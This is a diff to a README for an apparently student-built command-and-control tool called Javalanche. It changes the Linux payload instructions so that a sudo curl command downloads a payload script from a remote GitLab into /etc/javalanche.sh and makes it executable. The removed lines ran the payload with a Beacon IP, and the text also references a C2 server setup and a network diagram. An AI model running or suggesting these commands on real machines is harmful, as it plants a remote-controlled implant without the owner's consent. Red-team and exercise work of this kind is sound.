@@ -47,13 +47,9 @@ $ sudo ./serverSetup.sh -server Beacon
 
 Linux Payload
 
-bash> git clone "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.bash?ref_type=heads"
+$ sudo curl -o /etc/javalanche.sh "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
 
-bash> cd jms9508/Javalanche/Payloads
-
-bash> chmod +x linuxPayload.bash
-
-bash> ./linuxPayload.bash <Beacon IP address>
+$ sudo chmod +x /etc/javalanche.sh
 
 **Network Diagram:**
 ![alt text](Images/C2NetworkDiagram.drawio.png)
